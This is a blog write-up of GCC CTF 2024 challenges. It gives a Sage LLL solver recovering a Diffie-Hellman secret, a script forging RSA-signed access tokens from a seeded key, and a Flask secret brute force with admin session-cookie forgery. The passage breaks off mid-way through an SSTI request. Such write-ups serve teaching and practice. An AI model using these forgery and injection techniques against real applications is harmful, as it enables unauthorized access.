<!doctype html>
































<html
  class="not-ready lg:text-base"
  style="--bg: #fbfbfb"
  lang="en"
>
  <head>
  <meta charset="utf-8" />
  <meta http-equiv="X-UA-Compatible" content="IE=edge" />
  <meta
    name="viewport"
    content="width=device-width, initial-scale=1, shrink-to-fit=no"
  />

  
  <title>GCC CTF 2024 Write-up - Berlian Gabriel</title>

  
  <meta name="theme-color" />

  
  
  
  
  <meta name="description" content="Cryptography Too Many Leaks A Hidden Number Problem attack using LLL algorithm to recover Diffie-Hellman shared secret from the leak of its most significant bits.
(39 Solves, 397 Points)
The Problem The following python script and output text files were given. 
The problematic part of the code is shown below.
# What ?! mask = ((1 &lt;&lt; 256) - 1 &lt;&lt; 256) &#43; (1 &lt;&lt; 255) r1 = s &amp; mask print(f&#34;{r1=}&#34;) This is a masking operation which will reveal a certain part of the shared secret between Alice and Bob." />
  <meta name="author" content="Berlian Gabriel" />
  

  
  
  
  
  
  
  <link rel="preload stylesheet" as="style" href="https://berliangabriel.github.io/main.min.css" />

  
  
  
  
  
  <link rel="preload" as="image" href="https://berliangabriel.github.io/theme.png" />

  
  
  
  
  

  
  
  <link rel="preload" as="image" href="https://berliangabriel.github.io/twitter.svg" />
  
  <link rel="preload" as="image" href="https://berliangabriel.github.io/linkedin.svg" />
  
  

  
  
  <script
    defer
    src="https://berliangabriel.github.io/highlight.min.js"
    onload="hljs.initHighlightingOnLoad();"
  ></script>
  

  
  
  

  
  <link rel="icon" href="https://berliangabriel.github.io/favicon.ico" />
  <link rel="apple-touch-icon" href="https://berliangabriel.github.io/apple-touch-icon.png" />

  
  <meta name="generator" content="Hugo 0.92.2" />

  
  
  
  
  
  <meta itemprop="name" content="GCC CTF 2024 Write-up">
<meta itemprop="description" content="Cryptography Too Many Leaks A Hidden Number Problem attack using LLL algorithm to recover Diffie-Hellman shared secret from the leak of its most significant bits.
(39 Solves, 397 Points)
The Problem The following python script and output text files were given. 
The problematic part of the code is shown below.
# What ?! mask = ((1 &lt;&lt; 256) - 1 &lt;&lt; 256) &#43; (1 &lt;&lt; 255) r1 = s &amp; mask print(f&#34;{r1=}&#34;) This is a masking operation which will reveal a certain part of the shared secret between Alice and Bob."><meta itemprop="datePublished" content="2024-03-04T03:12:54+08:00" />
<meta itemprop="dateModified" content="2024-03-04T03:12:54+08:00" />
<meta itemprop="wordCount" content="1477">
<meta itemprop="keywords" content="" />
  
  <meta name="twitter:card" content="summary"/>
<meta name="twitter:title" content="GCC CTF 2024 Write-up"/>
<meta name="twitter:description" content="Cryptography Too Many Leaks A Hidden Number Problem attack using LLL algorithm to recover Diffie-Hellman shared secret from the leak of its most significant bits.
(39 Solves, 397 Points)
The Problem The following python script and output text files were given. 
The problematic part of the code is shown below.
# What ?! mask = ((1 &lt;&lt; 256) - 1 &lt;&lt; 256) &#43; (1 &lt;&lt; 255) r1 = s &amp; mask print(f&#34;{r1=}&#34;) This is a masking operation which will reveal a certain part of the shared secret between Alice and Bob."/>

  
  
  
  <link rel="canonical" href="https://berliangabriel.github.io/post/gcc-ctf-2024/" />
  
  
</head>

  <body class="text-black duration-200 ease-out dark:text-white">
    <header class="mx-auto flex h-[4.5rem] max-w-3xl px-8 lg:justify-center">
  <div class="relative z-50 mr-auto flex items-center">
    <a
      class="-translate-x-[1px] -translate-y-[1px] text-2xl font-semibold"
      href="https://berliangabriel.github.io"
      >Berlian Gabriel</a
    >
    <div
      class="btn-dark text-[0] ml-4 h-6 w-6 shrink-0 cursor-pointer [background:url(./theme.png)_left_center/_auto_theme('spacing.6')_no-repeat] [transition:_background-position_0.4s_steps(5)] dark:[background-position:right]"
      role="button"
      aria-label="Dark"
    ></div>
  </div>

  <div
    class="btn-menu relative z-50 -mr-8 flex h-[4.5rem] w-[5rem] shrink-0 cursor-pointer flex-col items-center justify-center gap-2.5 lg:hidden"
    role="button"
    aria-label="Menu"
  ></div>

  
  <script>
    
    const htmlClass = document.documentElement.classList;
    setTimeout(() => {
      htmlClass.remove('not-ready');
    }, 10);

    
    const btnMenu = document.querySelector('.btn-menu');
    btnMenu.addEventListener('click', () => {
      htmlClass.toggle('open');
    });

    
    const metaTheme = document.querySelector('meta[name="theme-color"]');
    const lightBg = '#fbfbfb'.replace(/"/g, '');
    const setDark = (isDark) => {
      metaTheme.setAttribute('content', isDark ? '#000' : lightBg);
      htmlClass[isDark ? 'add' : 'remove']('dark');
      localStorage.setItem('dark', isDark);
    };

    
    const darkScheme = window.matchMedia('(prefers-color-scheme: dark)');
    if (htmlClass.contains('dark')) {
      setDark(true);
    } else {
      const darkVal = localStorage.getItem('dark');
      setDark(darkVal ? darkVal === 'true' : darkScheme.matches);
    }

    
    darkScheme.addEventListener('change', (event) => {
      setDark(event.matches);
    });

    
    const btnDark = document.querySelector('.btn-dark');
    btnDark.addEventListener('click', () => {
      setDark(localStorage.getItem('dark') !== 'true');
    });
  </script>

  <div
    class="nav-wrapper fixed inset-x-0 top-full z-40 flex h-full select-none flex-col justify-center pb-16 duration-200 dark:bg-black lg:static lg:h-auto lg:flex-row lg:!bg-transparent lg:pb-0 lg:transition-none"
  >
    
    
    <nav class="lg:ml-12 lg:flex lg:flex-row lg:items-center lg:space-x-6">
      
      <a
        class="block text-center text-2xl leading-[5rem] lg:text-base lg:font-normal"
        href="/about/"
        >About</a
      >
      
      <a
        class="block text-center text-2xl leading-[5rem] lg:text-base lg:font-normal"
        href="/contact/"
        >Contact</a
      >
      
    </nav>
    

    
    <nav
      class="mt-12 flex justify-center space-x-10 dark:invert lg:ml-12 lg:mt-0 lg:items-center lg:space-x-6"
    >
      
      <a
        class="h-8 w-8 text-[0] [background:var(--url)_center_center/cover_no-repeat] lg:h-6 lg:w-6"
        style="--url: url(./twitter.svg)"
        href="https://twitter.com/BerlianGM"
        target="_blank"
        rel="me"
      >
        twitter
      </a>
      
      <a
        class="h-8 w-8 text-[0] [background:var(--url)_center_center/cover_no-repeat] lg:h-6 lg:w-6"
        style="--url: url(./linkedin.svg)"
        href="https://linkedin.com/in/Berlian-Gabriel-Mongkoginta"
        target="_blank"
        rel="me"
      >
        linkedin
      </a>
      
    </nav>
    
  </div>
</header>


    <main
      class="prose prose-neutral relative mx-auto min-h-[calc(100%-9rem)] max-w-3xl px-8 pb-16 pt-12 dark:prose-invert"
    >
      

<article>
  <header class="mb-16">
    <h1 class="!my-0 pb-2.5">GCC CTF 2024 Write-up</h1>

    
    <div class="text-sm antialiased opacity-60">
      
      <time>Mar 4, 2024</time>
      
      
      
      
    </div>
    
  </header>

  <section><h1 id="cryptography">Cryptography</h1>
<h2 id="too-many-leaks">Too Many Leaks</h2>
<p><code>A Hidden Number Problem attack using LLL algorithm to recover Diffie-Hellman shared secret from the leak of its most significant bits.</code></p>
<p><em>(39 Solves, 397 Points)</em></p>
<p><img src="https://github.com/BerlianGabriel/BerlianGabriel.github.io/blob/main/resources/GCC-CTF-2024/header-DH.png?raw=true" alt=""></p>
<h3 id="the-problem">The Problem</h3>
<p>The following <a href="https://github.com/BerlianGabriel/BerlianGabriel.github.io/blob/main/resources/GCC-CTF-2024/too-many-leaks.py">python script</a> and <a href="https://github.com/BerlianGabriel/BerlianGabriel.github.io/blob/main/resources/GCC-CTF-2024/too-many-leaks.txt">output text</a> files were given.
<br/></p>
<p>The problematic part of the code is shown below.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#75715e"># What ?!</span>
mask <span style="color:#f92672">=</span> ((<span style="color:#ae81ff">1</span> <span style="color:#f92672">&lt;&lt;</span> <span style="color:#ae81ff">256</span>) <span style="color:#f92672">-</span> <span style="color:#ae81ff">1</span> <span style="color:#f92672">&lt;&lt;</span> <span style="color:#ae81ff">256</span>) <span style="color:#f92672">+</span> (<span style="color:#ae81ff">1</span> <span style="color:#f92672">&lt;&lt;</span> <span style="color:#ae81ff">255</span>)
r1 <span style="color:#f92672">=</span> s <span style="color:#f92672">&amp;</span> mask
print(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">{</span>r1<span style="color:#e6db74">=}</span><span style="color:#e6db74">&#34;</span>)
</code></pre></div><p>This is a masking operation which will reveal a certain part of the shared secret between Alice and Bob. The same masking is also applied to r2, which leaks a certain part of the shared secret between Alice and Charlie.</p>
<p>Secondly, with the way Charlie&rsquo;s public key (AC) and shared secret (s2) is constructed, a mathematical correlation between the first shared secret (s) and the second shared secret (s2) can be derived.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python">AC <span style="color:#f92672">=</span> pow(g,a<span style="color:#f92672">+</span>c,p)
s2 <span style="color:#f92672">=</span> pow(AC,b,p)
</code></pre></div><p>Finally, combining the leak for both s2 and s, and the mathematical correlation between s2 and s, a Hidden Number Problem attack with LLL can be used to retrieve both shared secrets.</p>
<h3 id="the-solution">The Solution</h3>
<p>r2 is the most significant 256 bits of s2 (leaving 255 bits to be recovered), while r1 is the most significant 255 bits of s is given (leaving 255 bits to be recovered). The interaction with charlie causes the following linear equation to be formed:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python">AC <span style="color:#f92672">=</span> pow(g,a<span style="color:#f92672">+</span>c,p)
AC <span style="color:#f92672">=</span> g<span style="color:#f92672">^</span>a <span style="color:#f92672">*</span> g<span style="color:#f92672">^</span>c mod p

s2 <span style="color:#f92672">=</span> pow(AC,b,p)
s2 <span style="color:#f92672">=</span> (g<span style="color:#f92672">^</span>(ab) <span style="color:#f92672">*</span> g<span style="color:#f92672">^</span>(bc)) mod p
s2 <span style="color:#f92672">=</span> s <span style="color:#f92672">*</span> g<span style="color:#f92672">^</span>(bc) mod p
s2 <span style="color:#f92672">=</span> s <span style="color:#f92672">*</span> B<span style="color:#f92672">^</span>c mod p

r2 <span style="color:#f92672">+</span> k2 <span style="color:#f92672">=</span> ( r1 <span style="color:#f92672">+</span> k1 ) <span style="color:#f92672">*</span> t mod p
</code></pre></div><p>We know r1, r2, and t, while k1 and k2 are small unknown. We can rearrange the equation to the following form, and then construct the following lattice basis to find k1 and k2 using LLL.</p>
<p><img src="https://github.com/BerlianGabriel/BerlianGabriel.github.io/blob/main/resources/GCC-CTF-2024/eq-1.png?raw=true" alt=""></p>
<p><img src="https://github.com/BerlianGabriel/BerlianGabriel.github.io/blob/main/resources/GCC-CTF-2024/matrix-1.png?raw=true" alt=""></p>
<p>In this specific case, the linear equation and lattice basis would be as follow:</p>
<p><img src="https://github.com/BerlianGabriel/BerlianGabriel.github.io/blob/main/resources/GCC-CTF-2024/eq-2.png?raw=true" alt=""></p>
<p><img src="https://github.com/BerlianGabriel/BerlianGabriel.github.io/blob/main/resources/GCC-CTF-2024/matrix-2.png?raw=true" alt=""></p>
<p>K is the upper bound for k1 and k2, which can be inferred from earlier that K = 2^255
From this lattice basis, LLL can be used to get the vector (k1,k2,K) that satisfy the corresponding linear equation.</p>
<p>Below is the solver script that can be used to perform LLL and retrieve the flag in sage.
<strong>solver.sage</strong></p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#f92672">import</span> hashlib
<span style="color:#f92672">from</span> Crypto.Cipher <span style="color:#f92672">import</span> AES
<span style="color:#f92672">from</span> Crypto.Util.Padding <span style="color:#f92672">import</span> unpad

<span style="color:#75715e">#Key in the value of B, c, p, r1, r2, ciphertext, and iv from chall.txt</span>

t<span style="color:#f92672">=</span>pow(B,c,p)
t_inverse <span style="color:#f92672">=</span> inverse_mod(int(t),int(p))
K<span style="color:#f92672">=</span><span style="color:#ae81ff">2</span><span style="color:#f92672">^</span><span style="color:#ae81ff">255</span>

M <span style="color:#f92672">=</span> Matrix(ZZ, [[p, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">0</span>], [t_inverse, <span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">0</span>], [r1<span style="color:#f92672">-</span>t_inverse<span style="color:#f92672">*</span>r2, <span style="color:#ae81ff">0</span>, K]])
L <span style="color:#f92672">=</span> M<span style="color:#f92672">.</span>LLL()

<span style="color:#75715e">#checking which vector has the k1 and k2 value that satisfy the linear equation</span>
<span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> range(L<span style="color:#f92672">.</span>nrows()):
    s2 <span style="color:#f92672">=</span> r2 <span style="color:#f92672">+</span> abs(L[i][<span style="color:#ae81ff">1</span>])
    s <span style="color:#f92672">=</span> r1 <span style="color:#f92672">+</span> abs(L[i][<span style="color:#ae81ff">0</span>])
    <span style="color:#66d9ef">if</span>(s2<span style="color:#f92672">%</span>p <span style="color:#f92672">==</span> s<span style="color:#f92672">*</span>t<span style="color:#f92672">%</span>p):
        <span style="color:#66d9ef">break</span>

sha1 <span style="color:#f92672">=</span> hashlib<span style="color:#f92672">.</span>sha1()
sha1<span style="color:#f92672">.</span>update(str(s)<span style="color:#f92672">.</span>encode(<span style="color:#e6db74">&#39;ascii&#39;</span>))
key <span style="color:#f92672">=</span> sha1<span style="color:#f92672">.</span>digest()[:<span style="color:#ae81ff">16</span>]
cipher <span style="color:#f92672">=</span> AES<span style="color:#f92672">.</span>new(key, AES<span style="color:#f92672">.</span>MODE_CBC, bytes<span style="color:#f92672">.</span>fromhex(iv))
print(unpad(cipher<span style="color:#f92672">.</span>decrypt(bytes<span style="color:#f92672">.</span>fromhex(ciphertext)), <span style="color:#ae81ff">16</span>)<span style="color:#f92672">.</span>decode())

</code></pre></div><p>Notice that the vector from L[0] does not give the value of k1 and k2 that satisfy the linear equation. That is why we move on to the next vector, L[1] which in fact, gives the right value for k1 and k2. A more detailed theoretical explanation can be found on section 6.2 in this <a href="https://hal.science/hal-03045663/document">paper</a> by Gabrielle de Micheli and Nadia Heninger.</p>
<p><em><strong>FLAG: <code>GCC{D1ff13_H3llm4n_L34k_15_FUn!!}</code></strong></em>
<br/></p>
<h2 id="gcc-news">GCC News</h2>
<p><code>Reproducable private key due to user-controlled seed, leading to Access Token forgery</code></p>
<h3 id="the-problem-1">The Problem</h3>
<p>The following <a href="https://github.com/BerlianGabriel/BerlianGabriel.github.io/blob/main/resources/GCC-CTF-2024/gcc-news.py">python script</a> was given.
<br/></p>
<p>The problematic part of the code is shown below.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">generate_key</span>(username):
    
	length <span style="color:#f92672">=</span> <span style="color:#66d9ef">lambda</span> x : len(bin(x)[<span style="color:#ae81ff">2</span>:])

	s <span style="color:#f92672">=</span> bytes_to_long(username<span style="color:#f92672">.</span>encode())

	random<span style="color:#f92672">.</span>seed(s)

</code></pre></div><p>The seed used to generate the modulus N was generated using username, which is user-controlled. This means attacker can replicate the seed generation and obtain the same modulus N.</p>
<h3 id="the-solution-1">The Solution</h3>
<p>By using the same username used for logging in as the seed value, using the script below, the private key for username <code>a</code> and its subscriber token can be generated.</p>
<p><strong>token-generator.py</strong></p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#f92672">import</span> hashlib
<span style="color:#f92672">import</span> base64
<span style="color:#f92672">import</span> random
<span style="color:#f92672">from</span> Crypto.Util.number <span style="color:#f92672">import</span> bytes_to_long, isPrime
<span style="color:#f92672">import</span> math

<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">hash_string_sha256</span>(message):
    message_bytes <span style="color:#f92672">=</span> message<span style="color:#f92672">.</span>encode(<span style="color:#e6db74">&#39;utf-8&#39;</span>)
    sha256_hash <span style="color:#f92672">=</span> hashlib<span style="color:#f92672">.</span>sha256()
    sha256_hash<span style="color:#f92672">.</span>update(message_bytes)
    hashed_message <span style="color:#f92672">=</span> sha256_hash<span style="color:#f92672">.</span>digest()

    <span style="color:#66d9ef">return</span> int<span style="color:#f92672">.</span>from_bytes(hashed_message, byteorder<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;big&#39;</span>)
<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">generate_private_key</span>(username):
	length <span style="color:#f92672">=</span> <span style="color:#66d9ef">lambda</span> x : len(bin(x)[<span style="color:#ae81ff">2</span>:])
	s <span style="color:#f92672">=</span> bytes_to_long(username<span style="color:#f92672">.</span>encode())
	random<span style="color:#f92672">.</span>seed(s)
	e <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x1001</span>
	phi <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>

	<span style="color:#66d9ef">while</span> math<span style="color:#f92672">.</span>gcd(phi,e) <span style="color:#f92672">!=</span> <span style="color:#ae81ff">1</span>:
		n <span style="color:#f92672">=</span> <span style="color:#ae81ff">1</span>
		factors <span style="color:#f92672">=</span> []
		<span style="color:#66d9ef">while</span> length(n) <span style="color:#f92672">&lt;</span> <span style="color:#ae81ff">2048</span>:
			temp_n <span style="color:#f92672">=</span> random<span style="color:#f92672">.</span>getrandbits(<span style="color:#ae81ff">48</span>)
			<span style="color:#66d9ef">if</span> isPrime(temp_n):
				n <span style="color:#f92672">*=</span> temp_n
				factors<span style="color:#f92672">.</span>append(temp_n)
		phi <span style="color:#f92672">=</span> <span style="color:#ae81ff">1</span>
		<span style="color:#66d9ef">for</span> f <span style="color:#f92672">in</span> factors:
			phi <span style="color:#f92672">*=</span> (f <span style="color:#f92672">-</span> <span style="color:#ae81ff">1</span>)

	d <span style="color:#f92672">=</span> pow(e, <span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>, phi)
	<span style="color:#66d9ef">return</span> (n,d)

<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">generate_signature</span>(message, private_key):
    n, d <span style="color:#f92672">=</span> private_key
    hashed_message <span style="color:#f92672">=</span> hash_string_sha256(message)
    signature <span style="color:#f92672">=</span> pow(hashed_message, d, n)
    <span style="color:#66d9ef">return</span> signature

msg <span style="color:#f92672">=</span> str({<span style="color:#e6db74">&#39;a&#39;</span> : [<span style="color:#66d9ef">True</span>]})
private_key <span style="color:#f92672">=</span> generate_private_key(<span style="color:#e6db74">&#39;a&#39;</span>)
signature <span style="color:#f92672">=</span> generate_signature(msg, private_key)

token <span style="color:#f92672">=</span> str(signature)
message <span style="color:#f92672">=</span> base64<span style="color:#f92672">.</span>b64encode(msg<span style="color:#f92672">.</span>encode())<span style="color:#f92672">.</span>decode()
print(token)
print(message)

</code></pre></div><p>Append the token and message value as query parameters to the <code>/news</code> endpoint, for example:</p>
<pre tabindex="0"><code>GET /news?token=411687187392232667280043351583240962509538124485599722468348536700421735151555946448379094652652625247399081658444636213682686696336913864975979564949711489929214627017199941463251823762554488189572696151893229658546387162901042311649171549787123697625171268915155821602967555177808630578485132095843219143851631448031736194135889218495277418635836302160784356004563722995322296770559351735102722802801233236178453915678233494327356578764296673537414652048395476834466127075458495967712163412744053414393231197339135496136001788925213347009899949480187786736688721140709009032619659863771005034307881023069696174005022&amp;message=eydhJzogW1RydWVdfQ%3d%3d%3D HTTP/1.1
</code></pre><p><em><strong>FLAG: <code>GCC{f1x3d_533d_d154bl3_r4nd0mn355}</code></strong></em>
<br/></p>
<h1 id="web">Web</h1>
<h2 id="find-the-compass">Find The Compass</h2>
<p><code>Weak key generation leading to login bypass via session cookie forgery. Server-side Template Injection (SSTI) leading to file reading</code></p>
<h3 id="the-problem-2">The Problem</h3>
<p>The following <a href="https://github.com/BerlianGabriel/BerlianGabriel.github.io/blob/main/resources/GCC-CTF-2024/find-the-compass.zip">zip file</a> was given.
<br/>
The key space from <code>generate_key</code> in utils.py is too small and bruteforceable. Once the correct key is obtained, a session cookie can be generated, which bypasses the login.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">generate_key</span>() <span style="color:#f92672">-&gt;</span> str:
    <span style="color:#e6db74">&#34;&#34;&#34;Generate a random key for the Flask secret (I love Python!)&#34;&#34;&#34;</span>
    <span style="color:#66d9ef">return</span> (<span style="color:#e6db74">&#39;&#39;</span><span style="color:#f92672">.</span>join([str(x) <span style="color:#66d9ef">for</span> x <span style="color:#f92672">in</span> [(int(x) <span style="color:#f92672">^</span> (int(time()) <span style="color:#f92672">%</span> <span style="color:#ae81ff">2</span> <span style="color:#f92672">^</span> randint(<span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">2</span>))) <span style="color:#66d9ef">for</span> x <span style="color:#f92672">in</span> [int(char) <span style="color:#66d9ef">for</span> char <span style="color:#f92672">in</span> str(digits[randint(<span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">9</span>)]) <span style="color:#f92672">*</span> <span style="color:#ae81ff">4</span>]]]))<span style="color:#f92672">.</span>rjust(<span style="color:#ae81ff">8</span>, <span style="color:#e6db74">&#39;0&#39;</span>)
 
</code></pre></div><p>This part of the code indicates an SSTI vulnerability, because the <code>author</code> and <code>content</code> value is user-controlled, and the htmlTemplate string is being processed with <code>.format(self=self</code>.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#66d9ef">class</span> <span style="color:#a6e22e">Renderer</span>(object):
    <span style="color:#e6db74">&#34;&#34;&#34;
</span><span style="color:#e6db74">    Proof of Concept to one day get rid of Jinja2. Who needs Jinja2 ?
</span><span style="color:#e6db74">    &#34;&#34;&#34;</span>
    <span style="color:#66d9ef">def</span> __init__(self, coordinates: str):
        <span style="color:#75715e"># Only a wise administrator can retrieve the coordinates of the compass.</span>
        self<span style="color:#f92672">.</span>coordinates <span style="color:#f92672">=</span> coordinates

    <span style="color:#66d9ef">def</span> <span style="color:#a6e22e">render</span>(self, author, content):
        author <span style="color:#f92672">=</span> escape(author)
        content <span style="color:#f92672">=</span> escape(content)
        htmlTemplate <span style="color:#f92672">=</span> <span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;&lt;p&gt;&lt;strong&gt;</span><span style="color:#e6db74">{</span>author<span style="color:#e6db74">}</span><span style="color:#e6db74">&lt;/strong&gt;: </span><span style="color:#e6db74">{</span>content<span style="color:#e6db74">}</span><span style="color:#e6db74">&lt;/p&gt;&#34;</span>
        <span style="color:#66d9ef">try</span>:
            <span style="color:#75715e">#Use escape for XSS protection</span>
            <span style="color:#66d9ef">return</span> (htmlTemplate<span style="color:#f92672">.</span>format(self<span style="color:#f92672">=</span>self))
        <span style="color:#66d9ef">except</span> <span style="color:#a6e22e">Exception</span> <span style="color:#66d9ef">as</span> e:
            print(e)
            <span style="color:#66d9ef">return</span> <span style="color:#e6db74">&#34;An error occured while rendering the reminder.&#34;</span>

</code></pre></div><h3 id="the-solution-2">The Solution</h3>
<p>Note that the <code>generate_key</code> function will generate random integers from 0 to 9, 4 times. Each randomization result will then be XOR-ed with <code>(int(time()) % 2</code> (possible value of 0 and 1)  <code>randint(0, 2)</code> and (possible value of 0, 1, and 2). This means, the final result of each XOR operations is only between 0 to 11.</p>
<p>Below is the script to generate all possible keys and store it in a text file.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python">possible_digits <span style="color:#f92672">=</span> [<span style="color:#ae81ff">0</span>,<span style="color:#ae81ff">1</span>,<span style="color:#ae81ff">2</span>,<span style="color:#ae81ff">3</span>,<span style="color:#ae81ff">4</span>,<span style="color:#ae81ff">5</span>,<span style="color:#ae81ff">6</span>,<span style="color:#ae81ff">7</span>,<span style="color:#ae81ff">8</span>,<span style="color:#ae81ff">9</span>,<span style="color:#ae81ff">10</span>,<span style="color:#ae81ff">11</span>]
simulated_keys <span style="color:#f92672">=</span> set()
<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">simulate_key_generation</span>():
    <span style="color:#66d9ef">for</span> a <span style="color:#f92672">in</span> possible_digits:
        <span style="color:#66d9ef">for</span> b <span style="color:#f92672">in</span> possible_digits:
            <span style="color:#66d9ef">for</span> c <span style="color:#f92672">in</span> possible_digits:
                <span style="color:#66d9ef">for</span> d <span style="color:#f92672">in</span> possible_digits:
                    simulated_keys<span style="color:#f92672">.</span>add((str(a)<span style="color:#f92672">+</span>str(b)<span style="color:#f92672">+</span>str(c)<span style="color:#f92672">+</span>str(d))<span style="color:#f92672">.</span>rjust(<span style="color:#ae81ff">8</span>, <span style="color:#e6db74">&#39;0&#39;</span>))
    <span style="color:#66d9ef">return</span> simulated_keys

possible_keys <span style="color:#f92672">=</span> simulate_key_generation()
<span style="color:#66d9ef">with</span> open(<span style="color:#e6db74">&#34;possible_keys.txt&#34;</span>, <span style="color:#e6db74">&#39;w&#39;</span>) <span style="color:#66d9ef">as</span> file:
    <span style="color:#66d9ef">for</span> key <span style="color:#f92672">in</span> possible_keys:
        file<span style="color:#f92672">.</span>write(key <span style="color:#f92672">+</span> <span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#39;</span>)

</code></pre></div><p>Afterwards, <code>flask-unsign</code> can be used to go through the key candidates by checking whether a key can be used to unsign a given cookie. In this case, a session cookie which was retrieved from the HTTP Response was used.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">flask-unsign --unsign --cookie <span style="color:#e6db74">&#34;.eJwNzLkNgDAMAMBdXFPwxE5gGeQvERIKRUKF2B1ugHvgvEpx248KW-az-QD1quqwAS1RLcXZRaJgZkYjCqqEwURUIq0mbmKsYRqzIk3kmVNaZ8TRDAZonfvd_qvc3jq8H8AAIu8.ZeNacQ.IUzAGsrvOpVX3adTsaWkW5Vcn5Q&#34;</span> --wordlist possible_keys.txt --no-literal-eval
<span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Session decodes to: <span style="color:#f92672">{</span><span style="color:#e6db74">&#39;logged_in&#39;</span>: False, <span style="color:#e6db74">&#39;nonce&#39;</span>: <span style="color:#e6db74">&#39;637cd872ebb7b5faa5d664cc654dbbcb769dbedbdac410fc5616efa8892550dd&#39;</span>, <span style="color:#e6db74">&#39;status&#39;</span>: <span style="color:#e6db74">&#39;guest&#39;</span><span style="color:#f92672">}</span>
<span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Starting brute-forcer with <span style="color:#ae81ff">8</span> threads..
<span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Found secret key after <span style="color:#ae81ff">3840</span> attempts
b<span style="color:#e6db74">&#39;01111118&#39;</span>
</code></pre></div><p>Once the key is obtained, a simple HTTP server with a modified logic to generate a forged session cookie can be setup. The respone from this HTTTP server  will generate a forged session cookie, where <code>logged_in</code> is set to <code>True</code> and <code>status</code> is set to <code>admin</code>, which can be used to bypass login.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#f92672">from</span> flask <span style="color:#f92672">import</span> Flask, session

app <span style="color:#f92672">=</span> Flask(__name__)
app<span style="color:#f92672">.</span>config[<span style="color:#e6db74">&#39;SECRET_KEY&#39;</span>] <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;01111118&#39;</span> <span style="color:#75715e">#Change with your own key from flask-unsign</span>

<span style="color:#a6e22e">@app</span><span style="color:#f92672">.</span>route(<span style="color:#e6db74">&#39;/&#39;</span>)
<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">index</span>():
    session[<span style="color:#e6db74">&#39;logged_in&#39;</span>] <span style="color:#f92672">=</span> <span style="color:#66d9ef">True</span>
    session[<span style="color:#e6db74">&#39;status&#39;</span>] <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;admin&#39;</span>
    session[<span style="color:#e6db74">&#39;username&#39;</span>] <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;admin&#39;</span>

    print(session)
    <span style="color:#66d9ef">return</span> <span style="color:#e6db74">&#34;Session cookie created!&#34;</span>

<span style="color:#66d9ef">if</span> __name__ <span style="color:#f92672">==</span> <span style="color:#e6db74">&#39;__main__&#39;</span>:
    app<span style="color:#f92672">.</span>run(debug<span style="color:#f92672">=</span><span style="color:#66d9ef">True</span>)
</code></pre></div><br/>
<p>After succesful access to <code>/reminder</code>, the next objective is to exploit SSTI to read flag.txt.
The following request will trigger the SSTI.</p>
<pre tabindex="0"><code>POST /reminder HTTP/1.1
Host: worker02.gcc-ctf.com:12006
Content-Length: 41
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.6045.199 Safari/537.36
Content-Type: application/json
Accept: */*
Origin: http://worker02.gcc-ctf.com:12006
Accept-Encoding: gzip, deflate, br
Accept-Language: en-US,en;q=0.9
Cookie: session=.eJw9zTEOwyAMQNG7eGYABDbkMhXYJqrUECnAVPXuydT1D-9_4XPuu8rr3WGb11ID_eyssIHlUFmQglaHKOysi0TBl5Q5K2FL1kml5q1FpkY15sBemg8YYkkEBsYsc43HKnI8AwNr6NXLof_0uwHqiCcC.ZeNohw.xvKSfagcEPwTsMF4XJQ2IOrQByk
Connection: close

